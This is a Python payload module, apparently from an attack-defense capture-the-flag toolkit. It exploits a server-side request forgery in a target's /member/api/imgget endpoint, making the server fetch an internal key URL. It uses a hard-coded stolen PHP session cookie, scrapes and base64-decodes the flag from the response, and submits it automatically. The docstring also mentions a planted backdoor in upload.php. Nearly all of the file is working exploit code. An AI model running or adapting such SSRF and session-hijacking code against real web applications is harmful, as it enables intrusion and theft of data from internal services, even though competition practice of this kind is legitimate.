'''
This is a default payload
if there is a backdoor in upload/upload.php,and key is pass
The real situation is much more complex
'''
import sys
import base64
sys.path.append('..')
from models.payload import Payload,PayloadFailException
import requests
from models.horse import Horse
from utils import Utils
from configuration import configuration as config
import re
from modules.flag.flag import sendFlag
import json

'''
needs to get host session here
'''

sessions = {
    '4.4.9.101':'no8grt00igagj5ubkbmta7pc34'
}

class P(Payload):
    def __init__(self,host):
        super().__init__(host,mode='execute')
    def execute(self):
        try:
            if self.host not in sessions:
                raise PayloadFailException('has not member session')
            session = sessions[self.host]
            url = 'http://{0}/member/api/imgget'.format(self.host)
            res = requests.get(url,params={
                'ebimgname':"http://192.168.100.1/Getkey"
            },timeout=2,headers={
                'Cookie':'PHPSESSID='+session
            })
            find = re.search(r'bold;margin: 15px 0;">(.*?)</div>',res.text)
            if find:
                flag = Utils.base64_d(find.group(1))
                if not flag:
                    raise PayloadFailException('flag base64decode fail '+find.group(1))
                msg = sendFlag(flag)
                return [flag,msg]
            else:
                raise PayloadFailException('flag not found')
        except Exception as e:
            raise PayloadFailException(str(e))